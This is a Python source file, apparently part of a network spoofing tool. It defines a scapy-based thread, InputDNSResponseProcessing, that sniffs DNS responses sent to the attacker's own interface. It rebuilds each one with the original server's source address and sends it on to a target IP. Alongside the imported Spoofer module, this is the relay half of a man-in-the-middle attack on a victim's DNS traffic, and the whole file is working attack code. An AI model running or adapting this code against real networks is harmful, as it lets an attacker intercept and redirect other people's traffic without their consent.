from scapy.all import *
from threading import Thread, Event
from Spoofer import Spoofer
from time import sleep
import netifaces


class InputDNSResponseProcessing(Thread):

    my_ip : str
    target_ip : str
    stop_event : Event

    def __init__(self, target_ip : str, interface : str) -> None:
        Thread.__init__(self)

        print("Initialization of InputDNSResponseProcessing module")
        
        assert target_ip is not None, "InputDNSResponseProcessing - Targeted IP can't be empty"
        self.target_ip = target_ip.strip()

        assert interface is not None, "InputDNSResponseProcessing - Interface can't be empty"
        self.interface = interface.strip()

        try:
            self.my_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
        except Exception as e:
            print(f"InputDNSResponseProcessing - Own IP fetching problem on interface {interface} : {e}")

        self.stop_event = Event()
    
    def input_dns_packet_response_target_callback(self,packet) -> None:
        if packet.haslayer(DNSRR) and packet.haslayer(IP) and packet[IP].dst == self.my_ip:
            response = IP(src = packet[IP].src, dst = self.target_ip)
            copied_layer = packet.getlayer(UDP)
            copied_layer[UDP].len = None
            copied_layer[UDP].chksum = None
            response = response / copied_layer
        
            send(response,count = 1, verbose = False)

    def stop_sniff(self, packet) -> bool:
        return self.stop_event.isSet()

    def stop(self) -> None:
        self.stop_event.set()


    def run(self) -> None:
        sniff(store = 0, prn = self.input_dns_packet_response_target_callback, stop_filter = self.stop_sniff)